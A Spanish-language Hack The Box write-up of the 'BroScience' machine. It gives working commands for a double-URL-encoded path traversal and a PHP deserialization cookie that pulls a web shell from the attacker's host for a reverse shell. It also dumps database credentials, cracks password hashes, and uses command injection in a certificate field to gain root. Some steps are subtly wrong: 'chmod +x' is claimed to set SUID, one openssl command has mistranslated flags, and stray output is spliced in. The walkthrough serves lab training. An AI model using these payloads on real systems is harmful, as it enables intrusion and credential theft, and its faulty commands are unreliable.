---
title: BroScience WriteUp
author: H4ckerLite 
date: 2023-03-22 00:00:00 +0800
categories: [hackthebox, machine, writeup]
tags: [medium, linux, writeup, hackthebox, directory transversal, SSL certificate, cookie, Postgresql]
image:
  path: ../../assets/img/commons/broScience-writeup/BroScience.png
  alt: BroScience WriteUp
pin: true
---
Tocaremos una máquina media de [HackTheBox](). Cuando creemos una cuenta nos pedirá una clave de activación, gracias a una vulnerabilidad de **directory transversal** podremos ver una manera de conseguir elcodigo con una funcion de tiempo a crear la cuenta. Para la escalada nos aprovecharemos de un vulnerabilidad en una clase de PHP que nos lanzará la shell como **www-data**. Con una base de datos de **Postgresql** podremos sacar la contraseña del usuario **Bill** y para la escalada nos aprovecharemos de una tarea cron que verifica el estado del certificado **SSL**.
## Escaneo NMAP
Realizamos un escaneo NMAP.

```bash
❯ nmap 10.10.11.195
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 16:46 -04
Nmap scan report for 10.10.11.195
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 2.32 seconds
```
## Analizando la Web
![Events ]({{ 'assets/img/commons/broScience-writeup/1.png' | relative_url }}){: .center-image }
_Web_

En el sertificado **SSL** encontramos un correo.

| administratror@broscience.htb


Si miramos vemos que podemos logearnios y crear una cuenta.

![Events ]({{ 'assets/img/commons/broScience-writeup/2.png' | relative_url }}){: .center-image }
_Crear Cuenta_

Una vez creada  emos esto:

![Events ]({{ 'assets/img/commons/broScience-writeup/3.png' | relative_url }}){: .center-image }
_Confrim Code_

Si intentamos logiarnos, nos dirá que la cuenta no está activada todavía.

![Events ]({{ 'assets/img/commons/broScience-writeup/4.png' | relative_url }}){: .center-image }
_Error_

Escaneando directorios vemos cosas ineresantes.

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://10.10.11.195/FUZZ 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.11.195/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000002:   301        9 L      28 W       315 Ch      "images"                                                                                                               
000000624:   301        9 L      28 W       317 Ch      "includes"                                                                                                             
000000716:   301        9 L      28 W       315 Ch      "manual"                                                                                                               
000001059:   301        9 L      28 W       319 Ch      "javascript"                                                                                                           
000001703:   301        9 L      28 W       315 Ch      "styles"                                                                                                               

Total time: 90.60100
Processed Requests: 10082
Filtered Requests: 10077
Requests/sec.: 111.2791
Nmap done: 1 IP address (1 host up) scanned in 2.32 seconds
```

![Events ]({{ 'assets/img/commons/broScience-writeup/5.png' | relative_url }}){: .center-image }
_Includes_


La ruta **/includes** nos llama la atención. Déspues de probar todos el unicó que nos llama la atención es  **/img.php**. 

![Events ]({{ 'assets/img/commons/broScience-writeup/6.png' | relative_url }}){: .center-image }
_img.php_

Si intentamos un directory transversal veremos esto:

![Events ]({{ 'assets/img/commons/broScience-writeup/7.png' | relative_url }}){: .center-image }
_img.php_
##  BYPASSYNG: Con doble URL ENCODE
Probando varios metos de ofuscacion me di cuenta que la baarra entra en conflicto, ¿Cómo se soluciona?, bueno podemos aplicar doble URL encode

Exelente pregunta, les daré una breve explicacíon: 
**By ChatGPT**

>Cuando se realiza una codificación de URL, algunos caracteres especiales se reemplazan por secuencias de escape que comienzan con el signo `%` seguido de un código hexadecimal. Por ejemplo, el caracter `/` se codifica como `%2f`.
>Si se tiene una cadena que ya ha sido codificada previamente y se desea codificarla nuevamente, se debe codificar cada uno de los caracteres que representan los caracteres especiales. En este caso, el `%` se codifica como `%25`, y luego el caracter `/` se codifica como `%2f`, resultando en la cadena `%252f`.

Sabiendo eso podemos inntear leer el `/etc/password` podemos usar curl o BurpSuite. 

![Events ]({{ 'assets/img/commons/broScience-writeup/8.png' | relative_url }}){: .center-image }
_Doble URL ENCODE_

En el reapeter apuntamos al **/etc/passwd**.

![Events ]({{ 'assets/img/commons/broScience-writeup/9.png' | relative_url }}){: .center-image }
_/etc/passwd_

Ahora con curl.
```bash
❯ curl -k 'https://10.10.11.195/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

## Directory Transversal
Ahora les comparto un [script de bash](https://github.com/h4ckerlite/BroScience-Script) que cree para ahorrar tiempo. Una vez clonado lo ejecutamos y tratamos de ver información de la página de login(login.php). Viendo el codigo del archivo PHP
```php
<?php
session_start();

// Check if user is logged in already
if (isset($_SESSION['id'])) {
    header('Location: /index.php');
}

// Handle a submitted log in form
if (isset($_POST['username']) && isset($_POST['password'])) {
    // Check if variables are empty
    if (!empty($_POST['username']) && !empty($_POST['password'])) {    
        include_once 'includes/db_connect.php';
        
        // Check if username:password is correct
        $res = pg_prepare($db_conn, "login_query", 'SELECT id, username, is_activated::int, is_admin::int FROM users WHERE username=$1 AND password=$2');
        $res = pg_execute($db_conn, "login_query", array($_POST['username'], md5($db_salt . $_POST['password'])));
        
        if (pg_num_rows($res) == 1) {
            // Check if account is activated
            $row = pg_fetch_row($res);
            if ((bool)$row[2]) {
                // User is logged in
                $_SESSION['id'] = $row[0];
                $_SESSION['username'] = $row[1];
                $_SESSION['is_admin'] = $row[3];

                // Redirect to home page
                header('Location: /index.php');
            } else {
                $alert = "Account is not activated yet";
            }
        } else {
            $alert = "Username or password is incorrect.";
        }
    } else {
        $alert = "Please fill in both username and password.";
    }
}
?>

<html>
    <head>
        <title>BroScience : Log In</title>
        <?php include_once 'includes/header.php'; ?>
    </head>
    <body>
        <?php include_once 'includes/navbar.php'; ?>
        <div class="uk-container uk-container-xsmall">
            <form class="uk-form-stacked" method="POST" action="login.php">
                <fieldset class="uk-fieldset">
                    <legend class="uk-legend">Log In</legend>
                    <?php
                    // Display any alerts
                    if (isset($alert)) {
                    ?>
                    <div uk-alert class="uk-alert-<?php if(isset($alert_type)){echo $alert_type;}else{echo 'danger';} ?>">
                            <a class="uk-alert-close" uk-close></a>
                            <?=$alert?>
                        </div>
                    <?php
                    }
                    ?>
                    <div class="uk-margin">
                        <input name="username" class="uk-input" placeholder="Username">
                    </div>
                    <div class="uk-margin">
                        <input name="password" class="uk-input" type="password" placeholder="Password">
                    </div>
                    <div class="uk-margin">
                        <button class="uk-button uk-button-default" type="submit">Log in</button>
                    </div>
                    <div class="uk-margin">
                        <a href="register.php">Create an account</a>
                    </div>
                </fieldset>
            </form>
        </div>
    </body>
</html>
```

Viendo el codigo, intentamos ver el `register.php` viendo que no hay una ruta sabemos que se encuentra en en el mismo directorio, procedemos a leerlo.

![Events ]({{ 'assets/img/commons/broScience-writeup/10.png' | relative_url }}){: .center-image }
_Registrer_

Vemos como activar la cuenta

![Events ]({{ 'assets/img/commons/broScience-writeup/13.png' | relative_url }}){: .center-image }
_Activation Code_


Al seguir analizando vemos que  llama  a `includes/utils.php`, procedemos a leerlo.

![Events ]({{ 'assets/img/commons/broScience-writeup/11.png' | relative_url }}){: .center-image }
_Activation Code_
Si lo leemos veremos esta función de PHP.

![Events ]({{ 'assets/img/commons/broScience-writeup/12.png' | relative_url }}){: .center-image }
_Function_

## Activando la cuenta
Nos creamos una cuenta y la interceptamos con BrupSuite, la mandamos al `Reapeter` la enviamos y copiamos la fecha.

![Events ]({{ 'assets/img/commons/broScience-writeup/14.png' | relative_url }}){: .center-image }
_Date_

Con la función PHP ponemos nuestra fecha y nos dara el codigo, Creamos un archivo.php

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(strtotime("Fri, 31 Mar 2023 20:59:29 GMT"));
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    echo $activation_code;
}
generate_activation_code()
?>
```
Lo ejecutamos...
```bash
❯ php code.php
HmKj5RgqljPy3516zxzpf2f5S2rBwzn9
```
Copiamos el código y lo ingresamos en:
>https://broscience.htb/activate.php?code=

Iniciamos sesión y estamos adentro.




![Hacker ]({{ 'assets/img/commons/broScience-writeup/hacker-glitch.gif' | relative_url }}){: .center-image }
_H4CKED!!!_

## Ganando accseso
Revisamos de nuevo el utils.php y vemos el siguiente codigo:
```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```

La clase avatar tiene un parámetro imgPath que se usa para indicar la ruta de la imagen y un parámetro tmp abre la imagen y guarda su contenido en el servidor.
La interfaz de avatar tiene un nombre de método/función __wakeup()que crea una nueva instancia de clase de avatar y un método de guardado de clase para la clase de avatar.Entonces, en teoría, si pudiéramos establecer la ruta img en nuestro servidor y hacer que reciba un shell PHP, la ruta tmp lo almacenará en el servidor y podríamos activar un shell inverso después de activarlo.

![Events ]({{ 'assets/img/commons/broScience-writeup/16.png' | relative_url }}){: .center-image }
_Utils.php modificado_

Lo ejecutamos..


```bash
❯ php utils-avatar.php
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE0LjUwL3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3NoZWxsLnBocCI7fQ==
```

Usando un CookieEditor lo copiamos y lo introducimos en donde dice  `user-prefs`.

![Hacker ]({{ 'assets/img/commons/broScience-writeup/17.png' | relative_url }}){: .center-image }
_Cookie_

Nos creamos una shell.php con ese nombre y abrimos un servidor python.
```bash
python -m http.server 80
```

Y nustro Listenig....
```bash
nc -lvnp 443
```

En el navegador hacemos referencia a ese archivo y Pwned!!!. 
>Recuerda aplicar el [Tratamiento a la TTY](https://h4ckerlite.github.io/posts/tty/)
```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.50] from (UNKNOWN) [10.10.11.195] 35568
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux
 19:08:51 up 18:09,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1230): Inappropriate ioctl for device
bash: no job control in this shell
www-data@broscience:/$ 
```

![Hacker ]({{ 'assets/img/commons/broScience-writeup/roblox.gif' | relative_url }}){: .center-image }
_PWNED!!!_

## Migrando de WWW-DATA a Bill
Si se acuerdan de la carpata includes había una archivo db_connect.php, lo miramos.
```bash
www-data@broscience:/var/www/html$ ls includes/
db_connect.php	header.php  img.php  navbar.php  utils.php
www-data@broscience:/var/www/html$ cat includes/db_connect.php 
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
```

Vemos claves para una Base de Datos, pero mysql no esta instalado. Pero... vemos un puerto. Buscando en Google vemos que se tratat de `postgresql`. Usando este [blog](https://hasura.io/blog/top-psql-commands-and-flags-you-need-to-know-postgresql/) nos enseñan a conectarnos.
```bash
www-data@broscience:/var/www/html/includes$ psql -h localhost -p 5432 -d broscience -U dbuser -W
Password: RangeOfMotion%777
psql (13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

broscience=> 
```

Mostramos las tablas disponibles.


```bash
broscience-> \dt
           List of relations
 Schema |   Name    | Type  |  Owner   
--------+-----------+-------+----------
 public | comments  | table | postgres
 public | exercises | table | postgres
 public | users     | table | postgres
(3 rows)
```
Mostramos la data de la tabla

```bash
oscience=> select * from users;
 id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
  6 | mrt420        | 71d63fd0df7f8fb5e5121cbad6754799 | mrt420@mrt.com               | 3SdFiMzFushSzTBvEgP85atGTRBWH9r9 | f            | f        | 2023-03-31 19:32:22.994831-04
(6 rows)

broscience=> 
```

Copiamos los nombres y los hashes MD5. Con ayuda de REGEX podemos darle el formato apropiado

```bash
cat hash  | sed -E 's/^(\w+)\s*\|\s*(\w+)$/\1:\2/' > hashs
```

El hash esta salado, hacemos lo siguiente

```bash
15657792073e8a843d4f91fc403454e1:NaCl
13edad4932da9dbb57d9cd15b66ed104:NaCl
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
a7eed23a7be6fe0d765197b1027453fe:NaCl
5d15340bded5b9395d5d14b9c21bc82b:NaCl
71d63fd0df7f8fb5e5121cbad6754799:NaCl
```

Ahora necesitamos el modo correcto, les comparto la siguiente [wiki](https://hashcat.net/wiki/doku.php?id=example_hashes).
```bash
❯ hashcat -m 20 hashs /usr/share/wordlists/rockyou.txt
```
En un momento tendremos las contraseñas.

![Hacker ]({{ 'assets/img/commons/broScience-writeup/18.png' | relative_url }}){: .center-image }
_PWNED!!!_

Migramos...
```bash
su bill
```
bill@broscience:~$ cat user.txt 
be****************************50
bill@broscience:~$ 


Tenemos la priemra flag!
## Escalada de privilegios

Usando [pspy64](https://github.com/DominicBreuker/pspy) para ver procesos de root. Encontramos lo siguiente.

![Hacker ]({{ 'assets/img/commons/broScience-writeup/19.png' | relative_url }}){: .center-image }
_PsPy_

leyendo el contenido nos encontramos con un script de bash.

```bash
bill@broscience:~$ cat /opt/renew_cert.sh
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

¿Qué hace este scrript?

>ChatGPT: Este script es un archivo de shell (bash) que automatiza la renovación de un certificado de seguridad SSL/TLS en un servidor web mediante el uso de OpenSSL. A continuación, se explican las partes del código:
>La primera sección del código verifica si el script se ejecuta con un solo argumento que es el archivo de certificado que se va a renovar. Si el usuario proporciona más de un argumento o proporciona una opción de ayuda, se muestra un mensaje de uso y se sale del script.
>La segunda sección del código comprueba si el archivo de certificado especificado existe. Si existe, se utiliza OpenSSL para verificar la fecha de vencimiento del certificado. Si el certificado no ha caducado todavía, se muestra un mensaje y se sale del script. De lo contrario, se extraen los detalles del sujeto del certificado y se muestran en la salida.
>La tercera sección del código genera un nuevo certificado autofirmado con la misma información del sujeto que se extrajo del certificado anterior. El nuevo certificado se guarda en un directorio específico y se nombra después del nombre común del sujeto. El certificado anterior se reemplaza por el nuevo certificado recién generado.
>En resumen, el script automatiza la renovación de un certificado SSL/TLS para un servidor web. Si el certificado existente está a punto de caducar, el script genera un nuevo certificado autofirmado y lo reemplaza en el servidor.

Generamos un certificado SSL con el mismo nombre y le injectamos codigo malicioso.
```bash
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/ Certificados/broscience.crt -días 1
```
Nos debería quedar así.

```bash
bill@broscience:~$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days 1
Generating a RSA private key
....................................................................................++++
.............................++++
writing new private key to '/home/bill/Certs/broscience.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(chmod +x /bin/bash)
```

En unos minutos nuestra bash sera SUID.

```bash
bill@broscience:~/Certs$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
Hacemos lo siguiente:
```bash
bill@broscience:~/Certs$ bash -p
bash-5.1# whoami
root
bash-5.1# 
```
Procedemos a leer la flag
```bash
bash-5.1# cat /root/root.txt
da****************************8e
bash-5.1# 
```

![Hacker ]({{ 'assets/img/commons/broScience-writeup/hacker.gif' | relative_url }}){: .center-image }
_Rooted_

Esa fue la máquina de hoy, ¡Feliz Hackeo!

